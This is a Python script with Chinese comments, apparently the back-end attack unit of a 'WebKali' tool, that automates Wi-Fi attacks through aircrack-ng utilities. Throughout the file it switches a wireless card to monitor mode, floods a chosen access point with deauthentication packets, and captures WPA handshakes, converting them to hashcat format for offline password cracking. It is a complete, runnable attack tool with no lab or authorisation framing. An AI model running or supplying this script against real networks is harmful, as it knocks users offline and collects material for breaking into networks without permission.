import argparse
import subprocess
import time
import os
import sys
import shutil
import glob

# ==========================================
# WebKali 攻击执行单元 (修复版 - 增强抓包)
# ==========================================

# 修复环境变量，确保能找到工具
os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"


def run_cmd(cmd):
    """执行命令但不阻塞"""
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def log(msg, level="INFO"):
    """格式化输出"""
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    print(f"[{level}] {msg}")
    sys.stdout.flush()


def setup_monitor(interface, channel):
    log(f"正在配置网卡 {interface} 进入监听模式 (Channel {channel})...", "DEBUG")

    # 0. 关键：清理干扰进程，防止信道跳变
    run_cmd("airmon-ng check kill")

    # 1. 尝试使用 airmon-ng (处理 5GHz 更好)
    if shutil.which("airmon-ng"):
        # 很多时候 airmon-ng start 后网卡名会变 (wlan0 -> wlan0mon)
        # 这里为了简单，我们强制先还原再设置
        run_cmd(f"airmon-ng stop {interface}")
        run_cmd(f"ip link set {interface} down")
        run_cmd(f"iw dev {interface} set type monitor")
        run_cmd(f"ip link set {interface} up")
    else:
        run_cmd(f"ifconfig {interface} down")
        run_cmd(f"iwconfig {interface} mode monitor")
        run_cmd(f"ifconfig {interface} up")

    # 2. 强制锁定信道 (特别是 5GHz)
    run_cmd(f"iw dev {interface} set channel {channel}")
    run_cmd(f"iwconfig {interface} channel {channel}")
    time.sleep(1)  # 等待网卡稳定
    log(f"网卡 {interface} 监听模式已就绪", "SUCCESS")


def attack_deauth(bssid, interface, duration):
    """Deauth 攻击逻辑"""
    log(f"开始 Deauth 攻击: {bssid} (Duration: {duration}s)", "INFO")

    cmd = f"aireplay-ng --ignore-negative-one -0 0 -a {bssid} {interface}"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    start_time = time.time()

    try:
        while True:
            if duration > 0 and (time.time() - start_time) > duration:
                break

            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line and "Sending" in line:
                # 降低日志频率
                if int(time.time()) % 3 == 0:
                    print(f"[Attack] ⚡ 发送 Deauth 数据包...")

            sys.stdout.flush()
    except Exception:
        pass
    finally:
        process.terminate()
        run_cmd("killall aireplay-ng")


def capture_handshake(bssid, interface, channel, duration):
    """
    完整的握手包捕获流程：
    1. 启动 airodump-ng (后台)
    2. 循环发送 Deauth (踢人)
    3. 实时检查握手包是否到手
    """
    duration = int(duration) if int(duration) > 0 else 60
    log(f"启动握手包捕获任务: Target={bssid} IFace={interface}", "START")

    clean_bssid = bssid.replace(":", "")
    dump_prefix = f"/tmp/handshake_{clean_bssid}"

    # 清理旧文件
    run_cmd(f"rm -f {dump_prefix}*")

    # 1. 启动抓包进程 (后台)
    # 必须指定 --channel，否则会跳频漏包
    airodump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {dump_prefix} --output-format cap {interface}"
    dump_proc = subprocess.Popen(airodump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    start_time = time.time()
    handshake_captured = False

    try:
        log("等待 airodump-ng 初始化...", "INFO")
        time.sleep(3)

        while (time.time() - start_time) < duration:
            # 2. 发送攻击包 (间歇性，防止把目标打死连不上)
            log("发送 Deauth 诱导重连...", "ATTACK")
            run_cmd(f"aireplay-ng -0 3 -a {bssid} {interface} --ignore-negative-one")

            # 3. 检查是否捕获成功
            # 查找生成的 .cap 文件
            cap_files = glob.glob(f"{dump_prefix}*.cap")
            if cap_files:
                # 取最新的一个
                latest_cap = max(cap_files, key=os.path.getctime)

                # 使用 aircrack-ng 检查文件内容
                check_cmd = f"aircrack-ng {latest_cap} | grep '1 handshake'"
                res = subprocess.run(check_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                if "1 handshake" in res.stdout:
                    log("✅ 成功捕获握手包! (Handshake Captured)", "SUCCESS")
                    print("CAPTURED_HS_POTENTIAL")  # 关键标记，供后端识别
                    handshake_captured = True

                    # 尝试转换 (可选)
                    if shutil.which("hcxpcapngtool"):
                        run_cmd(f"hcxpcapngtool -o {dump_prefix}.hc22000 {latest_cap}")

                    break

            # 等待用户重连的时间
            time.sleep(5)

        if not handshake_captured:
            log("超时未捕获到握手包", "FAIL")

    except Exception as e:
        log(f"捕获过程出错: {e}", "ERROR")
    finally:
        dump_proc.terminate()
        run_cmd("killall airodump-ng")
        run_cmd("killall aireplay-ng")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="0")
    args = parser.parse_args()

    setup_monitor(args.interface, args.channel)

    if args.mode == "deauth":
        attack_deauth(args.bssid, args.interface, int(args.duration))
    elif args.mode == "handshake":
        capture_handshake(args.bssid, args.interface, args.channel, args.duration)